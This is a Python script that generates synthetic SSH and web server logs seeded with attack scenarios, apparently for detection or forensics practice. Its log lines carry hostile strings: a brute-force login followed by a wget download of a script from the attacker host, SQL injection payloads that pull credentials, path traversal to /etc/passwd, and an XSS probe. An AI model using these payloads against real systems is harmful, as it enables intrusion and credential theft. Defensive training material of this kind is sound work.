#!/usr/bin/env python3
"""Generate realistic demo logs with embedded attack scenarios.

All attacker IPs come from RFC 5737 documentation ranges (192.0.2.0/24,
198.51.100.0/24, 203.0.113.0/24), so they never point to real hosts.
Deterministic output (fixed random seed).
"""
import random
from datetime import datetime, timedelta
from pathlib import Path

random.seed(1337)
OUT = Path(__file__).resolve().parent
START = datetime(2026, 11, 14, 0, 0, 0)
users = ["martin", "deploy", "backup"]
lan = [f"10.0.10.{i}" for i in range(20, 35)]
auth, web = [], []


def syslog(t, svc, msg, pid=None):
    pid = pid or random.randint(1000, 65000)
    auth.append((t, f"{t:%b %d %H:%M:%S} web01 {svc}[{pid}]: {msg}"))


def access(t, ip, method, path, status, size, ua):
    web.append((t, f'{ip} - - [{t:%d/%b/%Y:%H:%M:%S} +0200] "{method} {path} HTTP/1.1" {status} {size} "-" "{ua}"'))


BROWSER = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0 Safari/537.36"
# ---- normal background traffic -------------------------------------------
for i in range(260):
    t = START + timedelta(minutes=random.randint(0, 2 * 24 * 60))
    syslog(t, "sshd", f"Accepted publickey for {random.choice(users)} from {random.choice(lan)} port "
                      f"{random.randint(40000, 60000)} ssh2: ED25519 SHA256:abc")
pages = ["/", "/about", "/services", "/contact", "/blog/post-1", "/blog/post-2", "/static/app.css",
         "/static/app.js", "/img/logo.png", "/api/v1/products?page=2"]
for i in range(1400):
    t = START + timedelta(seconds=random.randint(0, 2 * 24 * 3600))
    access(t, f"198.18.{random.randint(0, 9)}.{random.randint(2, 250)}", "GET", random.choice(pages),
           random.choice([200] * 18 + [304, 404]), random.randint(300, 40000), BROWSER)
for i in range(6):
    t = START + timedelta(hours=random.randint(8, 40))
    syslog(t, "sudo", f"  martin : TTY=pts/0 ; PWD=/home/martin ; USER=root ; COMMAND=/usr/bin/apt update")

# ---- Scenario 1: SSH brute force that SUCCEEDS (credential compromise) ----
t = START + timedelta(hours=3, minutes=12)
for i in range(180):
    t += timedelta(seconds=random.randint(1, 4))
    syslog(t, "sshd", f"Failed password for deploy from 203.0.113.66 port {random.randint(30000, 60000)} ssh2")
t += timedelta(seconds=3)
syslog(t, "sshd", "Accepted password for deploy from 203.0.113.66 port 51111 ssh2")
syslog(t + timedelta(minutes=2), "sudo", "  deploy : TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/wget http://203.0.113.66/x.sh")

# ---- Scenario 2: password spraying -----------------------------------------
t = START + timedelta(hours=14)
for u in ["admin", "test", "oracle", "ubuntu", "postgres", "git", "ftp", "pi", "guest", "user"]:
    for _ in range(2):
        t += timedelta(seconds=random.randint(20, 90))
        syslog(t, "sshd", f"Invalid user {u} from 198.51.100.23 port {random.randint(30000, 60000)}")
        syslog(t, "sshd", f"Failed password for invalid user {u} from 198.51.100.23 port 4{random.randint(1000, 9999)} ssh2")

# ---- Scenario 3: noisy bot hammering root ---------------------------------
t = START + timedelta(hours=22)
for i in range(64):
    t += timedelta(seconds=random.randint(2, 30))
    syslog(t, "sshd", f"Failed password for root from 192.0.2.150 port {random.randint(30000, 60000)} ssh2")
syslog(START + timedelta(hours=30), "sshd", "Accepted publickey for root from 10.0.10.21 port 50022 ssh2: RSA SHA256:x")

# ---- Scenario 4: web attacks ------------------------------------------------
t = START + timedelta(hours=9)
for w in ["admin", "backup", "old", "test", "dev", "phpmyadmin", "wp-admin", "config", "uploads", "api/v2",
          "console", "server-status", ".svn", "cgi-bin", "debug", "private", "logs", "tmp", "db", "staging",
          "panel", "cpanel", "manager", "jenkins", "solr", "actuator", "graphql", "swagger", "vendor", "install",
          "setup", "shell", "secret", "internal", "portal"]:
    t += timedelta(milliseconds=180)
    access(t, "203.0.113.9", "GET", f"/{w}/", 404, 196, "gobuster/3.6")
access(t + timedelta(seconds=1), "203.0.113.9", "GET", "/.env", 200, 812, "gobuster/3.6")
access(t + timedelta(seconds=2), "203.0.113.9", "GET", "/.git/HEAD", 200, 23, "gobuster/3.6")
t = START + timedelta(hours=10)
for p in ["/products.php?id=1'", "/products.php?id=1' OR '1'='1", "/products.php?id=1 UNION SELECT null,version()--",
          "/products.php?id=1 AND SLEEP(5)", "/products.php?id=1 UNION SELECT table_name FROM information_schema.tables--",
          "/products.php?id=-1 UNION SELECT username,password FROM users--"] * 3:
    t += timedelta(seconds=random.randint(1, 3))
    access(t, "198.51.100.77", "GET", p.replace(" ", "%20"), random.choice([200, 500]), random.randint(200, 5000),
           "sqlmap/1.8.4#stable (https://sqlmap.org)")
t = START + timedelta(hours=11)
for p in ["/download?file=../../../../etc/passwd", "/search?q=<script>alert(1)</script>",
          "/index.php?page=....//....//etc/passwd", "/cgi-bin/test.cgi", "/admin/config.bak"]:
    t += timedelta(seconds=2)
    access(t, "192.0.2.44", "GET", p.replace(" ", "%20"), random.choice([400, 403, 404]), 210,
           "Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:007)")

auth.sort()
web.sort()
(OUT / "auth.log").write_text("\n".join(l for _, l in auth) + "\n")
(OUT / "access.log").write_text("\n".join(l for _, l in web) + "\n")
print(f"auth.log: {len(auth)} lines, access.log: {len(web)} lines")
